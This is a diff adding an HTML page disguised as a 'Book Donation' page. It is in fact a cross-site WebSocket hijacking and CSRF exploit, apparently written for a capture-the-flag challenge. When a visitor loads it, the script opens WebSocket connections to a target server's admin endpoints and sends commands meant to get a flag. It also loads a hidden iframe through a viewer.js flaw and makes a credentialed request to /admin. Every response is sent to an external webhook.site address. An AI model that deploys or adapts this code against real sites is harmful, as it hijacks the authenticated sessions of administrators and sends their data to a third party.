@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Book Donation</title>
+</head>
+<body>
+    <h1>Processing your donation...</h1>
+    
+    <script>
+        // Your webhook URL for logging
+        const webhookUrl = "https://webhook.site/cd378acf-df8b-4652-9a25-4916c9e84851";
+        
+        // Target server information
+        const targetOrigin = "65.109.201.174:8080";
+        
+        // Log function to send data to our webhook
+        function logData(label, data) {
+            fetch(`${webhookUrl}?${label}=${encodeURIComponent(JSON.stringify(data))}`);
+        }
+        
+        // Log that our page loaded
+        logData("page_loaded", {time: new Date().toString()});
+        
+        // Main exploit - WebSocket CSRF
+        try {
+            const ws = new WebSocket(`ws://${targetOrigin}/admin/ws`);
+            
+            ws.onopen = function() {
+                logData("ws_opened", {status: "WebSocket connection established"});
+                
+                // Try different commands to get the flag
+                ws.send("increment"); // Default command from admin.js
+                setTimeout(() => ws.send("getflag"), 500);
+                setTimeout(() => ws.send("flag"), 1000);
+                setTimeout(() => ws.send("admin"), 1500);
+                setTimeout(() => ws.send("get_flag"), 2000);
+                setTimeout(() => ws.send("help"), 2500);
+            };
+            
+            ws.onmessage = function(event) {
+                logData("ws_message", {data: event.data});
+            };
+            
+            ws.onerror = function(error) {
+                logData("ws_error", {error: "WebSocket connection failed"});
+                fallbackExploits();
+            };
+            
+            ws.onclose = function() {
+                logData("ws_closed", {status: "WebSocket connection closed"});
+            };
+        } catch(e) {
+            logData("ws_exception", {error: e.toString()});
+            fallbackExploits();
+        }
+        
+        // Fallback exploits if direct WebSocket fails
+        function fallbackExploits() {
+            // Try viewer.js exploit
+            exploitViewer();
+            
+            // Try direct XHR request
+            setTimeout(tryXHRExploit, 1000);
+            
+            // Try WebSocket protocol for statistics
+            setTimeout(exploitStatsWebSocket, 2000);
+        }
+        
+        // Exploit through viewer.js iframe loading
+        function exploitViewer() {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            
+            // Use viewer.js vulnerability to load WebSocket URL in iframe
+            iframe.src = `http://${targetOrigin}/viewer#ws://${targetOrigin}/admin/ws`;
+            document.body.appendChild(iframe);
+            
+            iframe.onload = function() {
+                logData("iframe_loaded", {status: "Iframe loaded"});
+            };
+        }
+        
+        // Try standard XHR request to admin endpoint
+        function tryXHRExploit() {
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", `http://${targetOrigin}/admin`, true);
+            xhr.withCredentials = true;
+            xhr.onload = function() {
+                logData("xhr_response", {status: xhr.status, response: xhr.responseText});
+            };
+            xhr.onerror = function() {
+                logData("xhr_error", {status: "XHR request failed"});
+            };
+            xhr.send();
+        }
+        
+        // Try exploiting the statistics WebSocket from counter.js
+        function exploitStatsWebSocket() {
+            try {
+                const statsWs = new WebSocket(`ws://${targetOrigin}/ws`);
+                
+                statsWs.onopen = function() {
+                    logData("stats_ws_opened", {status: "Stats WebSocket opened"});
+                    // Try to inject commands to this WebSocket too
+                    statsWs.send("admin");
+                    setTimeout(() => statsWs.send("getflag"), 500);
+                };
+                
+                statsWs.onmessage = function(event) {
+                    logData("stats_ws_message", {data: event.data});
+                    
+                    // If we received data that looks like a flag, close connection
+                    if(event.data.includes("CE441")) {
+                        statsWs.close();
+                    }
+                };
+                
+                statsWs.onerror = function() {
+                    logData("stats_ws_error", {status: "Stats WebSocket error"});
+                };
+            } catch(e) {
+                logData("stats_ws_exception", {error: e.toString()});
+            }
+        }
+    </script>
+</body>
+</html>
